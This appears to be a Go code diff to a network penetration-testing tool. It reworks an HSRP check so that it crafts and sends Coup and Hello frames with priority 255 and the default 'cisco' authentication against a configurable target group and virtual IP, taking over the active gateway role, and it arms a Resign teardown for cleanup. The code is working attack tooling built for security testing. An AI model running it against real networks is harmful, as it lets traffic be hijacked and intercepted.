@@ -17,8 +17,9 @@ import (
 
 	"go.aledante.io/FlowSeer/src/common/errs"
 
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
 	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
+	"go.aledante.io/FlowSeer/src/edge/netpen/link"
 )
 
 type hsrpFinding struct {
@@ -31,39 +32,44 @@ type hsrpFinding struct {
 }
 
 // RunHSRP arms a resign teardown before sending a Coup and hello for the
-// fixed fixture group. It requires the runner's teardown and emitter handles
-// and returns craft or send errors with operation context.
-func RunHSRP(ctx context.Context, deps runner.Deps) error {
-	src := srcMAC()
-	group := uint8(1)
+// target's group and virtual IP from the attack leg's own addresses. The
+// priority of 255 and the authentication string are probe content. The
+// verdict is pending: coup acceptance needs a hello listener that phase 2
+// adds. Craft and send errors carry operation context.
+func RunHSRP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
+	if err := deps.Target.Need(check.FieldGroup, check.FieldVirtualIP); err != nil {
+		return check.Verdict{}, err
+	}
+	addr := deps.AttackLeg.Addr()
+	group := uint8(deps.Target.Group)
 	priority := uint8(255)
-	vip := net.IPv4(10, 0, 0, 1)
+	vip := deps.Target.VirtualIP
 
 	// Arm the resign teardown before the first frame.
-	resignPkt, err := craftHSRP(src, nl.HSRPOpcodeResign, nl.HSRPStateStandby, priority, group)
+	resignPkt, err := craftHSRP(addr, nl.HSRPOpcodeResign, nl.HSRPStateStandby, priority, group, vip)
 	if err != nil {
-		return errs.Wrap(err, "hsrp: craft resign")
+		return check.Verdict{}, errs.Wrap(err, "hsrp: craft resign")
 	}
 	deps.Teardown.Arm("hsrp-resign", func(ctx context.Context) error {
 		return deps.AttackLeg.Send(ctx, resignPkt)
 	})
 
 	// Send the Coup to steal the active role.
-	coupPkt, err := craftHSRP(src, nl.HSRPOpcodeCoup, nl.HSRPStateActive, priority, group)
+	coupPkt, err := craftHSRP(addr, nl.HSRPOpcodeCoup, nl.HSRPStateActive, priority, group, vip)
 	if err != nil {
-		return errs.Wrap(err, "hsrp: craft coup")
+		return check.Verdict{}, errs.Wrap(err, "hsrp: craft coup")
 	}
 	if err := deps.AttackLeg.Send(ctx, coupPkt); err != nil {
-		return errs.Wrap(err, "hsrp: send coup")
+		return check.Verdict{}, errs.Wrap(err, "hsrp: send coup")
 	}
 
 	// Send a hello to maintain the active state.
-	helloPkt, err := craftHSRP(src, nl.HSRPOpcodeHello, nl.HSRPStateActive, priority, group)
+	helloPkt, err := craftHSRP(addr, nl.HSRPOpcodeHello, nl.HSRPStateActive, priority, group, vip)
 	if err != nil {
-		return errs.Wrap(err, "hsrp: craft hello")
+		return check.Verdict{}, errs.Wrap(err, "hsrp: craft hello")
 	}
 	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
-		return errs.Wrap(err, "hsrp: send hello")
+		return check.Verdict{}, errs.Wrap(err, "hsrp: send hello")
 	}
 
 	detail, _ := json.Marshal(hsrpFinding{
@@ -76,14 +82,14 @@ func RunHSRP(ctx context.Context, deps runner.Deps) error {
 	})
 	deps.Emitter.Finding("hsrp", detail)
 
-	return nil
+	return check.Pending("no observable: coup acceptance needs a hello listener"), nil
 }
 
 // craftHSRP builds a full HSRP frame: Ethernet → IPv4 → UDP(1985) → HSRP.
-func craftHSRP(src net.HardwareAddr, opcode nl.HSRPOpcode, state nl.HSRPState, priority, group uint8) ([]byte, error) {
+func craftHSRP(addr link.Addr, opcode nl.HSRPOpcode, state nl.HSRPState, priority, group uint8, vip net.IP) ([]byte, error) {
 	eth := &layers.Ethernet{
 		DstMAC:       hsrpDstMAC,
-		SrcMAC:       src,
+		SrcMAC:       addr.MAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
 	ip := &layers.IPv4{
@@ -91,7 +97,7 @@ func craftHSRP(src net.HardwareAddr, opcode nl.HSRPOpcode, state nl.HSRPState, p
 		IHL:      5,
 		TTL:      1,
 		Protocol: layers.IPProtocolUDP,
-		SrcIP:    net.IPv4(10, 0, 0, 2),
+		SrcIP:    addr.IPv4,
 		DstIP:    net.IPv4(224, 0, 0, 2),
 	}
 	udp := &layers.UDP{
@@ -107,7 +113,7 @@ func craftHSRP(src net.HardwareAddr, opcode nl.HSRPOpcode, state nl.HSRPState, p
 		Priority:  priority,
 		Group:     group,
 		Auth:      [8]byte{'c', 'i', 's', 'c', 'o', 0, 0, 0},
-		VirtualIP: net.IPv4(10, 0, 0, 1).To4(),
+		VirtualIP: vip.To4(),
 	}
 	return craftUDPLayer(eth, ip, udp, hsrp)
 }
